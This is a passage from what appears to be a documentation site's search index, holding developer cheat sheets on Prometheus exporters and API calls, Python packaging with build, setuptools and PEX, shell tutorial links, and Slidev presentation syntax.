blackbox-exporter:9115\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#mysql-exporter","title":"MySQL Exporter","text":"<pre><code>docker run -d -p 9104:9104 \\\n  -e DATA_SOURCE_NAME=\"user:password@(mysql:3306)/\" \\\n  prom/mysqld-exporter\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#postgresql-exporter","title":"PostgreSQL Exporter","text":"<pre><code>docker run -d -p 9187:9187 \\\n  -e DATA_SOURCE_NAME=\"postgresql://user:password@postgres:5432/database?sslmode=disable\" \\\n  prometheuscommunity/postgres-exporter\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#redis-exporter","title":"Redis Exporter","text":"<pre><code>docker run -d -p 9121:9121 \\\n  oliver006/redis_exporter \\\n  --redis.addr=redis://redis:6379\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#http-api","title":"HTTP API","text":""},{"location":"cheat-sheet/prometheus/prometheus/#query-api","title":"Query API","text":"<pre><code># Instant query\ncurl 'http://localhost:9090/api/v1/query?query=up'\n\n# Range query\ncurl 'http://localhost:9090/api/v1/query_range?query=up&amp;start=2024-01-01T00:00:00Z&amp;end=2024-01-01T01:00:00Z&amp;step=15s'\n\n# Query with time parameter\ncurl 'http://localhost:9090/api/v1/query?query=up&amp;time=2024-01-01T12:00:00Z'\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#metadata-api","title":"Metadata API","text":"<pre><code># List all metric names\ncurl 'http://localhost:9090/api/v1/label/__name__/values'\n\n# Get label values\ncurl 'http://localhost:9090/api/v1/label/job/values'\n\n# Get series\ncurl 'http://localhost:9090/api/v1/series?match[]=up'\n\n# Get targets\ncurl 'http://localhost:9090/api/v1/targets'\n\n# Get alertmanagers\ncurl 'http://localhost:9090/api/v1/alertmanagers'\n\n# Get rules\ncurl 'http://localhost:9090/api/v1/rules'\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#admin-api","title":"Admin API","text":"<pre><code># Reload configuration\ncurl -X POST http://localhost:9090/-/reload\n\n# Quit Prometheus\ncurl -X POST http://localhost:9090/-/quit\n\n# Health check\ncurl http://localhost:9090/-/healthy\n\n# Ready check\ncurl http://localhost:9090/-/ready\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#command-line-flags","title":"Command Line Flags","text":"<pre><code># Custom config file\nprometheus --config.file=/path/to/prometheus.yml\n\n# Custom storage path\nprometheus --storage.tsdb.path=/data\n\n# Custom port\nprometheus --web.listen-address=:9091\n\n# Enable admin API\nprometheus --web.enable-admin-api\n\n# Enable lifecycle API (reload)\nprometheus --web.enable-lifecycle\n\n# Log level\nprometheus --log.level=debug\n\n# Retention time\nprometheus --storage.tsdb.retention.time=30d\n\n# Retention size\nprometheus --storage.tsdb.retention.size=50GB\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/prometheus/prometheus/#naming-conventions","title":"Naming Conventions","text":"<pre><code># Counter: Use _total suffix\nhttp_requests_total\nerrors_total\n\n# Gauge: Use descriptive name\ncurrent_connections\nmemory_usage_bytes\n\n# Histogram: Use _bucket, _sum, _count\nhttp_request_duration_seconds_bucket\nhttp_request_duration_seconds_sum\nhttp_request_duration_seconds_count\n\n# Use base units\n- seconds (not milliseconds)\n- bytes (not kilobytes)\n- ratio 0-1 (not percentage)\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#label-best-practices","title":"Label Best Practices","text":"<pre><code># Good labels\nhttp_requests_total{method=\"GET\", status=\"200\", endpoint=\"/api/users\"}\n\n# Avoid high cardinality labels\n# Bad: user_id, request_id, timestamp\n# Good: method, status, endpoint, service\n\n# Use consistent label names\ninstance, job, environment, region\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#query-optimization","title":"Query Optimization","text":"<pre><code># Use recording rules for expensive queries\n# Pre-calculate aggregations\n# Avoid regex when possible\n\n# Good\nhttp_requests_total{job=\"api\"}\n\n# Less efficient\nhttp_requests_total{job=~\"api\"}\n\n# Use appropriate time ranges\nrate(metric[5m])  # Good for most cases\nrate(metric[1h])  # For long-term trends\n</code></pre>"},{"location":"cheat-sheet/prometheus/prometheus/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://prometheus.io/docs/</li> <li>PromQL guide: https://prometheus.io/docs/prometheus/latest/querying/basics/</li> <li>Exporters list: https://prometheus.io/docs/instrumenting/exporters/</li> <li>Best practices: https://prometheus.io/docs/practices/naming/</li> <li>Community: https://prometheus.io/community/</li> </ul>"},{"location":"cheat-sheet/python-build/python-build/","title":"Python Build - Cheat Sheet","text":""},{"location":"cheat-sheet/python-build/python-build/#overview","title":"Overview","text":"<p>This guide covers the various tools and methods for building, packaging, and distributing Python applications.</p>"},{"location":"cheat-sheet/python-build/python-build/#distribution-formats","title":"Distribution Formats","text":""},{"location":"cheat-sheet/python-build/python-build/#wheel-whl","title":"Wheel (.whl)","text":"<p>Standard binary distribution format for Python. Wheels are faster to install than source archives.</p> <p>Characteristics:</p> <ul> <li>ZIP format with <code>.whl</code> extension</li> <li>No compilation needed during installation</li> <li>Can contain compiled C extensions</li> <li>Name format: <code>{distribution}-{version}(-{build})?-{python}-{abi}-{platform}.whl</code></li> </ul> <p>Create a wheel:</p> <pre><code># With build (recommended - modern)\npython -m build --wheel\n\n# With setuptools (legacy)\npython setup.py bdist_wheel\n\n# With pip\npip wheel .\n</code></pre> <p>Install a wheel:</p> <pre><code>pip install package-1.0.0-py3-none-any.whl\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#source-distribution-targz","title":"Source Distribution (.tar.gz)","text":"<p>Source archive that requires compilation/build during installation.</p> <pre><code># Create a source distribution\npython -m build --sdist\n\n# Legacy\npython setup.py sdist\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#build-tools","title":"Build Tools","text":""},{"location":"cheat-sheet/python-build/python-build/#build-modern-pep-517","title":"<code>build</code> (Modern - PEP 517)","text":"<p>Standard recommended tool for building Python packages.</p> <p>Installation:</p> <pre><code>pip install build\n</code></pre> <p>Usage:</p> <pre><code># Build wheel + sdist\npython -m build\n\n# Wheel only\npython -m build --wheel\n\n# Source distribution only\npython -m build --sdist\n\n# Specify output directory\npython -m build --outdir dist/\n</code></pre> <p>Advantages:</p> <ul> <li>Follows PEP 517/518 standard</li> <li>Build isolation in a virtual environment</li> <li>Compatible with all build systems (setuptools, flit, poetry, etc.)</li> <li>No pollution of current environment</li> </ul>"},{"location":"cheat-sheet/python-build/python-build/#setuptools-legacy-but-still-used","title":"<code>setuptools</code> (Legacy but still used)","text":"<p>Traditional build system for Python.</p> <pre><code># Installation\npip install setuptools wheel\n\n# Build\npython setup.py build\npython setup.py sdist bdist_wheel\n\n# Development (editable install)\npip install -e .\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#configuration-files","title":"Configuration Files","text":""},{"location":"cheat-sheet/python-build/python-build/#pyprojecttoml-modern-pep-518","title":"<code>pyproject.toml</code> (Modern - PEP 518)","text":"<p>Standard configuration file for modern Python projects.</p> <p>Minimal structure:</p> <pre><code>[build-system]\nrequires = [\"setuptools&gt;=45\", \"wheel\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"my-package\"\nversion = \"1.0.0\"\ndescription = \"Package description\"\nreadme = \"README.md\"\nrequires-python = \"&gt;=3.8\"\nlicense = {text = \"MIT\"}\nauthors = [\n    {name = \"Your Name\", email = \"email@example.com\"}\n]\ndependencies = [\n    \"requests&gt;=2.28.0\",\n    \"numpy&gt;=1.20.0\",\n]\n\n[project.optional-dependencies]\ndev = [\n    \"pytest&gt;=7.0.0\",\n    \"black&gt;=22.0.0\",\n]\n\n[project.scripts]\nmy-cli = \"my_package.cli:main\"\n\n[tool.setuptools.packages.find]\nwhere = [\"src\"]\n</code></pre> <p>With different backends:</p> setuptoolsflitpoetryhatchling <pre><code>[build-system]\nrequires = [\"setuptools&gt;=61.0\", \"wheel\"]\nbuild-backend = \"setuptools.build_meta\"\n</code></pre> <pre><code>[build-system]\nrequires = [\"flit_core&gt;=3.2\"]\nbuild-backend = \"flit_core.buildapi\"\n</code></pre> <pre><code>[build-system]\nrequires = [\"poetry-core&gt;=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n</code></pre> <pre><code>[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#setuppy-legacy","title":"<code>setup.py</code> (Legacy)","text":"<p>Python script for package configuration. Still supported but <code>pyproject.toml</code> is preferred.</p> <p>Minimal example:</p> <pre><code>from setuptools import setup, find_packages\n\nsetup(\n    name=\"my-package\",\n    version=\"1.0.0\",\n    description=\"Package description\",\n    author=\"Your Name\",\n    author_email=\"email@example.com\",\n    packages=find_packages(where=\"src\"),\n    package_dir={\"\": \"src\"},\n    python_requires=\"&gt;=3.8\",\n    install_requires=[\n        \"requests&gt;=2.28.0\",\n        \"numpy&gt;=1.20.0\",\n    ],\n    extras_require={\n        \"dev\": [\n            \"pytest&gt;=7.0.0\",\n            \"black&gt;=22.0.0\",\n        ],\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"my-cli=my_package.cli:main\",\n        ],\n    },\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n)\n</code></pre> <p>With C extensions:</p> <pre><code>from setuptools import setup, Extension\n\next_modules = [\n    Extension(\n        \"my_package.fast_module\",\n        sources=[\"src/my_package/fast_module.c\"],\n        include_dirs=[\"src/my_package/include\"],\n    )\n]\n\nsetup(\n    name=\"my-package\",\n    version=\"1.0.0\",\n    ext_modules=ext_modules,\n)\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#setupcfg-intermediate","title":"<code>setup.cfg</code> (Intermediate)","text":"<p>Declarative alternative to <code>setup.py</code>, often used with a minimal <code>setup.py</code>.</p> <pre><code>[metadata]\nname = my-package\nversion = 1.0.0\ndescription = Package description\nauthor = Your Name\nauthor_email = email@example.com\nlicense = MIT\nclassifiers =\n    Programming Language :: Python :: 3.8\n    Programming Language :: Python :: 3.9\n\n[options]\npackages = find:\npackage_dir =\n    = src\npython_requires = &gt;=3.8\ninstall_requires =\n    requests&gt;=2.28.0\n    numpy&gt;=1.20.0\n\n[options.packages.find]\nwhere = src\n\n[options.extras_require]\ndev =\n    pytest&gt;=7.0.0\n    black&gt;=22.0.0\n\n[options.entry_points]\nconsole_scripts =\n    my-cli = my_package.cli:main\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#pex-python-executable","title":"PEX - Python EXecutable","text":"<p>Tool for creating self-contained Python executable files.</p> <p>Installation:</p> <pre><code>pip install pex\n</code></pre> <p>Create a PEX:</p> <pre><code># Simple PEX with dependencies\npex requests -o my-app.pex\n\n# PEX with an entry point\npex requests -c my_script.py -o my-app.pex\n\n# PEX with module and entry point\npex my_package -c my_package.cli:main -o my-cli.pex\n\n# PEX with source files\npex -D src/ -e my_package.main -o my-app.pex\n\n# PEX with requirements.txt\npex -r requirements.txt -o my-app.pex\n\n# Specify Python version\npex --python=python3.9 -r requirements.txt -o my-app.pex\n\n# Multi-platform PEX\npex --platform linux-x86_64 --platform macosx-x86_64 -r requirements.txt -o my-app.pex\n</code></pre> <p>Use a PEX:</p> <pre><code># Execute directly\n./my-app.pex\n\n# With Python\npython my-app.pex\n\n# Pass arguments\n./my-app.pex arg1 arg2 --option=value\n\n# Inspect contents\nPEX_TOOLS=1 ./my-app.pex\n\n# Extract contents\nunzip my-app.pex -d extracted/\n</code></pre> <p>Advanced options:</p> <pre><code># With custom shebang\npex --python-shebang=\"/usr/bin/env python3.9\" -r requirements.txt -o my-app.pex\n\n# Compile to bytecode\npex --compile -r requirements.txt -o my-app.pex\n\n# Disable cache\npex --disable-cache -r requirements.txt -o my-app.pex\n\n# Include resources\npex --resources-directory resources/ -r requirements.txt -o my-app.pex\n</code></pre> <p>PEX Advantages:</p> <ul> <li>\u2705 Single executable file</li> <li>\u2705 Isolated and reproducible environment</li> <li>\u2705 No installation needed</li> <li>\u2705 Multi-platform</li> <li>\u2705 Dependency caching</li> </ul> <p>Disadvantages:</p> <ul> <li>\u274c Larger file size</li> <li>\u274c Slightly longer startup time</li> <li>\u274c Complexity with some native dependencies</li> </ul>"},{"location":"cheat-sheet/python-build/python-build/#recommended-project-structure","title":"Recommended Project Structure","text":""},{"location":"cheat-sheet/python-build/python-build/#modern-layout-src-layout","title":"Modern layout (src-layout)","text":"<pre><code>my-project/\n\u251c\u2500\u2500 src/\n\u2502   \u2514\u2500\u2500 my_package/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u251c\u2500\u2500 module1.py\n\u2502       \u251c\u2500\u2500 module2.py\n\u2502       \u2514\u2500\u2500 cli.py\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 test_module1.py\n\u2502   \u2514\u2500\u2500 test_module2.py\n\u251c\u2500\u2500 docs/\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 LICENSE\n\u2514\u2500\u2500 .gitignore\n</code></pre> <p>Src-layout advantages:</p> <ul> <li>Avoids accidental imports from source directory</li> <li>Forces package installation for tests</li> <li>Better source/build separation</li> </ul>"},{"location":"cheat-sheet/python-build/python-build/#traditional-layout","title":"Traditional layout","text":"<pre><code>my-project/\n\u251c\u2500\u2500 my_package/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 module1.py\n\u2502   \u2514\u2500\u2500 module2.py\n\u251c\u2500\u2500 tests/\n\u251c\u2500\u2500 setup.py\n\u251c\u2500\u2500 pyproject.toml\n\u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#build-workflows","title":"Build Workflows","text":""},{"location":"cheat-sheet/python-build/python-build/#local-development","title":"Local development","text":"<pre><code># Editable install (recommended for development)\npip install -e .\n\n# With development dependencies\npip install -e \".[dev]\"\n\n# With pyproject.toml only\npip install -e \".[dev,test]\"\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#build-for-distribution","title":"Build for distribution","text":"<pre><code># 1. Clean previous builds\nrm -rf build/ dist/ *.egg-info\n\n# 2. Build the package\npython -m build\n\n# 3. Check the package\npip install twine\ntwine check dist/*\n\n# 4. Upload to PyPI\ntwine upload dist/*\n\n# 4bis. Test on TestPyPI first\ntwine upload --repository testpypi dist/*\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#build-with-pex-for-deployment","title":"Build with PEX for deployment","text":"<pre><code># 1. Build the wheel\npython -m build --wheel\n\n# 2. Create PEX from wheel\npex dist/my_package-1.0.0-py3-none-any.whl -c my_package.cli:main -o my-cli.pex\n\n# Or directly from installable package\npex . -c my_package.cli:main -o my-cli.pex\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#useful-commands","title":"Useful Commands","text":""},{"location":"cheat-sheet/python-build/python-build/#package-inspection","title":"Package inspection","text":"<pre><code># List files in a wheel\nunzip -l package.whl\n\n# Extract a wheel\nunzip package.whl -d extracted/\n\n# View metadata\npip show package-name\n\n# View dependencies\npip show -f package-name\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#dependency-management","title":"Dependency management","text":"<pre><code># Generate requirements.txt from environment\npip freeze &gt; requirements.txt\n\n# Generate only direct dependencies (with pip-tools)\npip install pip-tools\npip-compile pyproject.toml\npip-compile requirements.in\n\n# Update dependencies\npip-compile --upgrade\n\n# Sync environment\npip-sync requirements.txt\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#tests-before-publication","title":"Tests before publication","text":"<pre><code># Install from local wheel\npip install dist/package-1.0.0-py3-none-any.whl\n\n# Install from TestPyPI\npip install --index-url https://test.pypi.org/simple/ package-name\n\n# Verify imports\npython -c \"import my_package; print(my_package.__version__)\"\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#approach-comparison","title":"Approach Comparison","text":"Aspect setup.py pyproject.toml PEX Standard Legacy Modern (PEP 518) Executable Format Python TOML Binary ZIP Flexibility +++++ +++ ++ Simplicity ++ ++++ ++++ Distribution PyPI PyPI Single file Isolation No No Yes Size Small Small Large"},{"location":"cheat-sheet/python-build/python-build/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/python-build/python-build/#recommendations","title":"\u2705 Recommendations","text":"<ol> <li>Use <code>pyproject.toml</code> as main configuration (PEP 518)</li> <li>Use <code>python -m build</code> to build packages</li> <li>Adopt src-layout for new projects</li> <li>Semantic versioning (SemVer: MAJOR.MINOR.PATCH)</li> <li>Include README.md and LICENSE</li> <li>Test package before publication (TestPyPI)</li> <li>Use PEX for deployable CLI applications</li> <li>Pin versions in requirements.txt, not in pyproject.toml</li> </ol>"},{"location":"cheat-sheet/python-build/python-build/#avoid","title":"\u274c Avoid","text":"<ol> <li>\u274c Mixing setup.py and pyproject.toml without reason</li> <li>\u274c Using <code>python setup.py install</code> (deprecated)</li> <li>\u274c Forgetting <code>__init__.py</code> in packages</li> <li>\u274c Including secrets in package</li> <li>\u274c Unpinned versions in production</li> </ol>"},{"location":"cheat-sheet/python-build/python-build/#complete-examples","title":"Complete Examples","text":""},{"location":"cheat-sheet/python-build/python-build/#simple-cli-application","title":"Simple CLI application","text":"<p>pyproject.toml:</p> <pre><code>[build-system]\nrequires = [\"setuptools&gt;=61.0\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"my-cli\"\nversion = \"1.0.0\"\ndependencies = [\"click&gt;=8.0\", \"requests&gt;=2.28\"]\n\n[project.scripts]\nmy-cli = \"my_cli.main:cli\"\n</code></pre> <p>Build and distribution:</p> <pre><code># Development\npip install -e .\nmy-cli --help\n\n# Production - Wheel\npython -m build\npip install dist/my_cli-1.0.0-py3-none-any.whl\n\n# Production - PEX\npex . -c my_cli.main:cli -o my-cli.pex\n./my-cli.pex --help\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#library-with-c-extensions","title":"Library with C extensions","text":"<p>pyproject.toml:</p> <pre><code>[build-system]\nrequires = [\"setuptools&gt;=61.0\", \"wheel\", \"Cython&gt;=0.29\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"my-lib\"\nversion = \"2.0.0\"\n</code></pre> <p>setup.py (required for C extensions):</p> <pre><code>from setuptools import setup, Extension\nfrom Cython.Build import cythonize\n\nextensions = [\n    Extension(\n        \"my_lib.fast\",\n        [\"src/my_lib/fast.pyx\"],\n    )\n]\n\nsetup(\n    ext_modules=cythonize(extensions),\n)\n</code></pre> <p>Build:</p> <pre><code>python -m build\n</code></pre>"},{"location":"cheat-sheet/python-build/python-build/#resources","title":"Resources","text":"<ul> <li>PEP 517 - Build Backend</li> <li>PEP 518 - pyproject.toml</li> <li>PEP 621 - Project Metadata</li> <li>Python Packaging Guide</li> <li>PEX Documentation</li> <li>setuptools Documentation</li> </ul>"},{"location":"cheat-sheet/shell/shell/","title":"shell","text":"<ul> <li>grep + find, sed awk</li> </ul> <p>The bible</p>"},{"location":"cheat-sheet/shell/shell/#find","title":"find","text":"<p>The Geek Stuff \u2013 15 Find Commands</p> <p>The Geek Stuff \u2013 15 More Find Commands</p> <p>IBM \u2013 Advanced Find Techniques</p>"},{"location":"cheat-sheet/shell/shell/#grep","title":"grep","text":"<p>The Geek Stuff \u2013 15 Grep Commands</p>"},{"location":"cheat-sheet/shell/shell/#sed","title":"sed","text":"<p>John Cook \u2013 Learn a little sed</p> <p>The Geek Stuff \u2013 Sed Tips and Tricks</p> <p>Bruce Barnett \u2013 Sed Tutorial and Introduction</p> <p>Famous sed one-liners explained</p>"},{"location":"cheat-sheet/shell/shell/#awk","title":"awk","text":"<p>Greg Grothaus \u2013 Why you should learn just a little awk</p> <p>The Geek Stuff \u2013 8 Powerful Awk Built-in Variables</p> <p>Steve\u2019s awk academy</p> <p>Bruce Barnett \u2013 Awk Tutorial and Introduction</p> <p>Simple awk tutorial</p> <p>Famous awk one-liners explained</p>"},{"location":"cheat-sheet/shell/shell/#motivationphilosophy","title":"Motivation/Philosophy:","text":"<p>John Cook on Greg Grothaus on awk</p>"},{"location":"cheat-sheet/shell/shell/#general-command-line-introduction","title":"General Command-Line Introduction:","text":"<p>The Geek Stuff \u2013 50 Linux Commands</p> <ul> <li>cut</li> <li>vmstat</li> <li>uptime</li> </ul>"},{"location":"cheat-sheet/slidev/slidev/","title":"Slidev Cheat Sheet","text":""},{"location":"cheat-sheet/slidev/slidev/#installation","title":"Installation","text":""},{"location":"cheat-sheet/slidev/slidev/#create-a-new-project","title":"Create a new project","text":"<pre><code># Recommended with pnpm\npnpm create slidev\n\n# Alternatives\nnpm init slidev@latest\nyarn create slidev\nbun create slidev\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#prerequisites","title":"Prerequisites","text":"<ul> <li>Node.js &gt;= 18.0</li> </ul>"},{"location":"cheat-sheet/slidev/slidev/#basic-commands","title":"Basic commands","text":"<pre><code>slidev                  # Start development server\nslidev export          # Export to PDF/PPTX/PNG\nslidev build           # Build static web application\nslidev format          # Format slides\nslidev --help          # Show help\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#basic-structure","title":"Basic structure","text":""},{"location":"cheat-sheet/slidev/slidev/#slidesmd-file","title":"slides.md file","text":"<pre><code>---\ntheme: seriph\ntitle: My presentation\nbackground: /background.jpg\n---\n\n# Presentation title\nSubtitle or description\n\n---\n\n# Second slide\n\nSlide content\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#slide-separation","title":"Slide separation","text":"<pre><code>---\n# New slide with triple dash separator\n\n---\n\n# Another slide\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#frontmatter","title":"Frontmatter","text":""},{"location":"cheat-sheet/slidev/slidev/#global-configuration-first-slide","title":"Global configuration (first slide)","text":"<pre><code>---\ntheme: default              # Theme\nbackground: /cover.jpg      # Background image\nclass: text-center          # CSS classes\nhighlighter: shiki          # Syntax highlighter\nlineNumbers: false          # Line numbering\ninfo: |                     # Metadata\n  ## My presentation\n  Additional information\ndrawings:\n  persist: false            # Drawing persistence\ntransition: slide-left      # Slide transitions\ntitle: Title                # Presentation title\nmdc: true                   # Enable MDC syntax\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#per-slide-configuration","title":"Per-slide configuration","text":"<pre><code>---\nlayout: center              # Slide layout\nbackground: /image.jpg      # Specific background\nclass: text-white           # CSS classes\ntransition: fade            # Specific transition\nclicks: 3                   # Number of clicks\n---\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#built-in-layouts","title":"Built-in layouts","text":""},{"location":"cheat-sheet/slidev/slidev/#layout-center","title":"Layout center","text":"<pre><code>---\nlayout: center\n---\n\n# Centered content\nText in the center of the screen\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-cover-cover-page","title":"Layout cover (cover page)","text":"<pre><code>---\nlayout: cover\nbackground: /cover.jpg\n---\n\n# Main title\nPresentation description\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-two-cols-two-columns","title":"Layout two-cols (two columns)","text":"<pre><code>---\nlayout: two-cols\n---\n\n# Left column\nLeft content\n\n::right::\n\n# Right column\nRight content\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-image-left-image-right","title":"Layout image-left / image-right","text":"<pre><code>---\nlayout: image-left\nimage: /path/to/image.jpg\n---\n\n# Content on the right\nImage displays on the left\n</code></pre> <pre><code>---\nlayout: image-right\nimage: /path/to/image.jpg\n---\n\n# Content on the left\nImage displays on the right\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-quote","title":"Layout quote","text":"<pre><code>---\nlayout: quote\n---\n\n# \"Important quote\"\n\u2014 Author\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-section","title":"Layout section","text":"<pre><code>---\nlayout: section\n---\n\n# New section\nMarks the beginning of a new section\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-fact","title":"Layout fact","text":"<pre><code>---\nlayout: fact\n---\n\n# 1,000,000+\nActive users\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-iframe-left-iframe-right","title":"Layout iframe-left / iframe-right","text":"<pre><code>---\nlayout: iframe-right\nurl: https://example.com\n---\n\n# Embed a website\nIframe displays on the right\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-statement","title":"Layout statement","text":"<pre><code>---\nlayout: statement\n---\n\n# Important statement\nKey message of the presentation\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-default","title":"Layout default","text":"<pre><code>---\nlayout: default\n---\n\n# Default layout\nStandard content\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-full","title":"Layout full","text":"<pre><code>---\nlayout: full\n---\n\n# Full screen\nUses all available space\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-none","title":"Layout none","text":"<pre><code>---\nlayout: none\n---\n\nNo style applied\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-intro","title":"Layout intro","text":"<pre><code>---\nlayout: intro\n---\n\n# Introduction title\n## Author\nDescription\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#layout-end","title":"Layout end","text":"<pre><code>---\nlayout: end\n---\n\n# Thank you!\nQuestions?\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#code-blocks","title":"Code blocks","text":""},{"location":"cheat-sheet/slidev/slidev/#basic-code-with-syntax-highlighting","title":"Basic code with syntax highlighting","text":"<pre><code>\u200b```python\ndef hello():\n    print(\"Hello Slidev!\")\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#code-with-line-highlighting","title":"Code with line highlighting","text":"<pre><code>\u200b```python {2-3}\ndef hello():\n    print(\"Hello Slidev!\")  # Highlighted line\n    print(\"Line 3\")         # Highlighted line\n    print(\"Line 4\")\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#code-with-multiple-highlighting-steps","title":"Code with multiple highlighting steps","text":"<pre><code>\u200b```python {2|3|all}\ndef hello():\n    print(\"Step 1\")  # Displayed on 1st click\n    print(\"Step 2\")  # Displayed on 2nd click\n                    # 'all' displays everything on 3rd click\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#monaco-editor-interactive-code","title":"Monaco editor (interactive code)","text":"<pre><code>\u200b```ts {monaco}\nconsole.log('Editable code!')\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#monaco-editor-with-execution","title":"Monaco editor with execution","text":"<pre><code>\u200b```ts {monaco-run}\nconsole.log('Executable code')\n\u200b```\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#animations","title":"Animations","text":""},{"location":"cheat-sheet/slidev/slidev/#v-click-show-on-click","title":"v-click (show on click)","text":"<pre><code>&lt;v-click&gt;\n\nAppears on first click\n\n&lt;/v-click&gt;\n\n&lt;v-click&gt;\n\nAppears on second click\n\n&lt;/v-click&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-after-show-after-previous","title":"v-after (show after previous)","text":"<pre><code>&lt;v-click&gt;Element 1&lt;/v-click&gt;\n&lt;v-after&gt;Element 2 (appears right after)&lt;/v-after&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-click-with-hiding","title":"v-click with hiding","text":"<pre><code>&lt;v-click :hide=\"true\"&gt;\n\nThis element disappears on click\n\n&lt;/v-click&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-clicks-animate-a-list","title":"v-clicks (animate a list)","text":"<pre><code>&lt;v-clicks&gt;\n\n- Item 1 (click 1)\n- Item 2 (click 2)\n- Item 3 (click 3)\n\n&lt;/v-clicks&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-clicks-with-depth","title":"v-clicks with depth","text":"<pre><code>&lt;v-clicks depth=\"2\"&gt;\n\n- Level 1 (click 1)\n  - Level 2 (click 2)\n  - Level 2 (click 3)\n\n&lt;/v-clicks&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-click-on-inline-element","title":"v-click on inline element","text":"<pre><code>Normal text &lt;span v-click&gt;appearing text&lt;/span&gt; normal text\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-click-with-precise-timing","title":"v-click with precise timing","text":"<pre><code>&lt;div v-click=\"1\"&gt;Appears on click 1&lt;/div&gt;\n&lt;div v-click=\"3\"&gt;Appears on click 3&lt;/div&gt;\n&lt;div v-click=\"2\"&gt;Appears on click 2&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#v-click-with-range","title":"v-click with range","text":"<pre><code>&lt;div v-click=\"[2, 4]\"&gt;\n  Visible between clicks 2 and 4\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#motion-animations-v-motion","title":"Motion animations (v-motion)","text":""},{"location":"cheat-sheet/slidev/slidev/#basic-animation","title":"Basic animation","text":"<pre><code>&lt;div\n  v-motion\n  :initial=\"{ x: -80 }\"\n  :enter=\"{ x: 0 }\"&gt;\n  Slide from the left\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/slidev/slidev/#complete-animation-with-clicks","title":"Complete animation with clicks","text":"<pre><code>&lt;div\n  v-motion\n  :initial=\"{ x: -80, opacity: 0 }\"\n  :enter=\"{ x: 0, opacity: 1, transition: { delay: 100 } }\"\n  :click-1=\"{ x: 80 }\"\n  :click-2=\"{ y: -50, opacity: 0 